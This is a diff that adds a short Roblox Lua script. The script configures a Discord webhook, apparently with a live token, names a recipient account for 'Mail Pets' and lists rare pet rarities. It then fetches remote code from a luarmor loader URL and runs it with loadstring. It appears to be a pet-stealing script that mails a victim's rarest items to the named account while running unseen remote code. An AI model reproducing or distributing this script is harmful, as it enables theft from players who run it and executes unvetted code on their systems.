@@ -1,1 +1,8 @@
-
+getgenv().Settings = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1289579158007189609/q4h1mG2gc4O_t6DbA9ydmcCCj_c0ESxHEohNKckEnGmR4XBenI06rh09U_fJFz_nrWIU",
+    ["Discord ID"] = "everyone",
+    
+    ["Mail Pets"] = "plzluckx200",
+    ["Rarities"] = {"Secret", "Exclusive", "Divine", "Celestial", "Superior", "Mythical"},
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
